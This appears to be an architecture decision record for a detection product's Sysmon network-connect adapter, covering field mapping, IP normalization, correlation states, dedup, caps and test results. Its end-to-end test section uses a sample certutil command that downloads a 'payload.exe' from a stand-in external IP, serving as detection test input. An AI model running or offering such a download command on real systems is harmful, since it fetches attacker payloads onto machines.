# ADR-0010r · P2 · Slice-2 · Sysmon Event 3 (Network Connect) — 🟢 GREEN

**Status**: 🟢 PASS · Slice-2 shipped (2026-08-12 · Session-19)
**Scope**: Sysmon Event 3 (Network Connect) telemetry adapter only.
**Companion**: ADR-0023 (P2 direction) · ADR-0010q (Slice-1 blueprint) · UI-DEF-02 (authoritative MITRE surface).

---

## 1. Files touched (Slice-2 only)

```
backend/services/behavioral/sysmon_adapter.py       (extended: Event 3 branch, IP canonicalization, correlation states, dedup, cap, advisory tagging)
backend/routers/behavioral.py                        (413 status for eid3_cap_exceeded; new response keys network_evidence.*)
backend/tests/canonical/api/test_p2_sysmon_adapter.py                (updated adapter id, retargeted rejection test to EID 5)
backend/tests/canonical/api/test_p2_slice2_sysmon_event3.py          (new · 8 focused Event-3 tests)
backend/tests/canonical/api/test_p2_slice2_extended_contract.py      (new · 12 extended-contract tests)
backend/tests/canonical/ssot/test_ssot_isolation.py                  (allow-list entries)
memory/adr/0010r-p2-slice-2-sysmon-event3.md                         (this file)
memory/experiments/rip/results.p2_slice1_run.json                    (pre-Slice-2 baseline snapshot)
memory/experiments/rip/results.p2_slice2_run.json                    (post-Slice-2 harness run)
```

## 2. Canonical Event-3 schema

| Sysmon Data field | Canonical field | Confidence tier | Advisory? |
|---|---|---|---|
| `Image`               | `process.image`               | high | – |
| `ProcessId`           | `process.pid`                 | high | – |
| `ProcessGuid`         | `process.guid`                | high | – |
| `User`                | `process.user`                | medium | – |
| `Protocol`            | `network.protocol`            | high | – |
| `Initiated`           | `network.initiated`           | medium | – |
| `SourceIsIpv6`        | `network.source_is_ipv6`      | low | – |
| `SourceIp`            | `network.source_ip`           | high | – |
| `SourcePort`          | `network.source_port`         | medium | – |
| `SourceHostname`      | `network.source_hostname`     | advisory | ✅ |
| `SourcePortName`      | `network.source_port_name`    | advisory | ✅ |
| `DestinationIsIpv6`   | `network.destination_is_ipv6` | low | – |
| `DestinationIp`       | `network.destination_ip`      | high | – |
| `DestinationPort`     | `network.destination_port`    | high | – |
| `DestinationHostname` | `network.destination_hostname`| advisory | ✅ |
| `DestinationPortName` | `network.destination_port_name` | advisory | ✅ |
| `RuleName`            | `network.rule_name`           | medium | – |

Absent fields produce no record — no fabrication.

## 3. IP normalization rules (ADR-0010r §6-10)

- `ipaddress.ip_address(raw)` — reject unparseable input.
- IPv6 → RFC 5952 compressed, lowercase (via `str(addr)`).
- IPv4-mapped IPv6 (`::ffff:1.2.3.4`) → `1.2.3.4` (via `addr.ipv4_mapped`).
- Canonical form is used for **evidence_ref generation, dedup key, and `observed_value`**.
- Raw wire form is preserved on the connection record under `destination_ip_raw` / `source_ip_raw` so analysts can see exactly what Sysmon emitted.

## 4. Destination classification

Uses **explicit RFC 1918 / IANA reserved-range membership**, NOT Python `is_private` (which conflates RFC 1918 with documentation ranges like 198.51.100.0/24).

| Value | Meaning |
|---|---|
| `loopback` | 127.0.0.0/8 · ::1 |
| `linklocal` | 169.254.0.0/16 · fe80::/10 |
| `rfc1918` | 10.0.0.0/8 · 172.16.0.0/12 · 192.168.0.0/16 |
| `rfc4193` | fc00::/7 (IPv6 ULA) |
| `external` | Anything else |
| `unknown` | Empty / malformed |

Classification is an **evidence flag only** — never used as a verdict driver.

## 5. Correlation states (ADR-0010r §17-19)

| State | When | Semantics |
|---|---|---|
| `RESOLVED` | Event 3 `ProcessGuid` matches an Event 1 `ProcessGuid` in the same batch | Emit `correlated_with.process_create_evidence_ref` |
| `UNRESOLVED_DANGLING` | Event 3 has a valid `ProcessGuid` but no matching Event 1 | Evidence PRESERVED with flag — never silently dropped |
| `AMBIGUOUS_PID_ONLY` | Event 3 has PID but no `ProcessGuid` | Flag surfaced; NO promotion to authoritative process lineage (PIDs recycle) |

Every network-connection record carries a `correlation_state`.

## 6. Dedup policy

**Key** = `(ProcessGuid, protocol, canonical_destination_ip, destination_port, "in"|"out")`.

Collapsed records preserve:
- `count` — number of underlying events
- `first_seen` / `last_seen` — extreme `TimeCreated` values in the batch
- `raw_refs` — every underlying `evidence_ref`

Outbound (`Initiated=true`) and inbound (`Initiated=false`) are **never** flattened together (ADR-0010r §5).

## 7. Fail-loud cap

- `NIVX_SYSMON_EID3_MAX_EVENTS` env var, default **5000**.
- On overflow → adapter raises `SysmonAdapterError("eid3_cap_exceeded")` → router returns **HTTP 413** with `detail.error="eid3_cap_exceeded"`.
- Never silently truncates.

## 8. ATT&CK boundaries (ADR-0010r §37-47)

- Event 3 alone → **empty** `mitre_technique_ids` in the response.
- The router hands ONLY Event 1 `CommandLine` fields to the authoritative MITRE surface (`services.die.api.analyze`).
- No LOLBIN-network-connection technique inference from the adapter.
- No T1071.001 / T1105 / T1571 / T1090 from network evidence alone. Those techniques are locked to the authoritative surface, which requires the execution + behavioural context UI-DEF-02 established.
- Locked test `test_event3_alone_emits_no_authoritative_technique` guards this invariant.

## 9. Security controls preserved from Slice-1

- Auth-gated (`get_current_user`).
- 512 KB XML cap (`NIVX_SYSMON_MAX_BYTES`).
- defusedxml XXE-safe (fallback to stdlib with entities disabled).
- Event-ID whitelist: **{1, 3}** only (5, 11, 22 all reject with 422).
- **Zero outbound lookups** — locked by static grep test `test_adapter_makes_no_outbound_calls_at_import`.

## 10. Test results

| Suite | Result |
|---|---|
| `test_p2_sysmon_adapter.py` (Slice-1) | 7/7 PASS |
| `test_p2_slice1_no_corpus_impact.py` | 2/2 PASS |
| `test_p2_slice2_sysmon_event3.py` (Slice-2 base · 8 tests + 8 parametrized) | 16/16 PASS |
| `test_p2_slice2_extended_contract.py` (extended spec · 12 tests) | 14/14 PASS |
| `test_ui_def_02_convergence.py` | 8/8 PASS |
| `test_item5_ti_lookup_bounded.py` | 10/10 PASS |
| `test_p02_evidence_chain.py` | 30/30 PASS |
| `test_workspace_isolation_guard.py` | 4/4 PASS |
| `test_ssot_isolation.py` | 3/3 PASS |
| **Total combined regression** | **94 PASS · 2 skip · 0 FAIL** |

## 11. Frozen 12-case corpus

- Two harness replays back-to-back — `results.p2_slice2_run.json` compared against `results.p2_slice1_run.json`.
- **0 deltas** across 12 cases (verdict / risk_score_bucket / mitre_ids / lolbas_bins / ioc_counts / language).
- Determinism gate: run1 == run2 (locked by harness snapshot check).

## 12. Live end-to-end proof

Preview URL probe with:
- Event 1: `explorer.exe → certutil.exe -urlcache -split -f http://198.51.100.20/payload.exe C:\Users\Public\upd.exe`.
- Event 3 (a): `certutil.exe → ::ffff:198.51.100.20:80` (IPv4-mapped IPv6).
- Event 3 (b): same connection but `DestinationIp=198.51.100.20` (raw IPv4).

Response (verbatim key values):
- `adapter=sysmon.slice2@1.0`
- `event_counts_by_id={eid1: 1, eid3: 2}`
- `mitre_technique_ids=['T1105', 'T1140', 'T1218']` (from Event 1 command line via authoritative surface — Event 3 contributed none)
- `network_evidence.connections=1` (dedup of 2 IP-form variants of same logical address)
  - `destination_ip="198.51.100.20"` (canonicalized)
  - `destination_class="external"`
  - `correlation_state="RESOLVED"`
  - `correlated_with_process_create="05cd45e63832"` (points at the Event 1 evidence_ref)
  - `count=2`, `first_seen="2026-08-12T10:00:01Z"`, `last_seen="2026-08-12T10:00:05Z"`
  - `raw_refs` — 2 preserved
- `limitations.destination_reputation` — non-verdict language surfaced.

**Cruise-Missile chain reconstruction confirmed live:**
```
explorer.exe  →  certutil.exe  →  http://198.51.100.20/payload.exe download
     (Event 1 · parent-child)   (Event 1 · command line → MITRE T1105/T1140/T1218)
                                     ↓
                    198.51.100.20:80 (external) — Event 3 · RESOLVED via ProcessGuid
```

## 13. Uncovered limitations (deliberately deferred)

- **EVTX binary format** — Slice-2 accepts only Sysmon Event XML. EVTX binary support is the next transport-layer slice.
- **Cross-batch correlation** — Slice-2 correlates within a single ingest request. Multi-request / multi-host causal joins require the IKG persistence slice.
- **DNS lookup discipline** — Event 22 (DNS query) is out of Slice-2 scope. `DestinationHostname` remains advisory until an Event-22-fed narrative rule is defined.
- **Time skew** — the adapter treats `TimeCreated` as opaque wall-clock text; monotonic-clock reconciliation is deferred.

## 14. What Slice-2 does NOT do

- No Event 11 (file create), no Event 12/13 (registry), no Event 22 (DNS).
- No IKG writes.
- No Workspace UI panel.
- No verdict / risk-score contribution from network evidence.
- No parallel MITRE mapper.
- No refactor of Slice-1 code beyond the additive Event-3 branch.

## 15. Standing down

Slice-2 closed. **P2 Slice-3 (EVTX binary transport adapter over the same normalizer) is next per the owner's recommended sequence.** Do NOT proceed to any slice without explicit authorisation.

Locked sequence remaining:
```
P2 Slice-1 Event 1        ✅
P2 Slice-2 Event 3        ✅  (this ADR)
       ↓ (await owner)
P2 Slice-3 EVTX binary transport
       ↓
Event 11 / Event 22 slices
       ↓
IKG persistence
       ↓
Workspace behavioural timeline
```
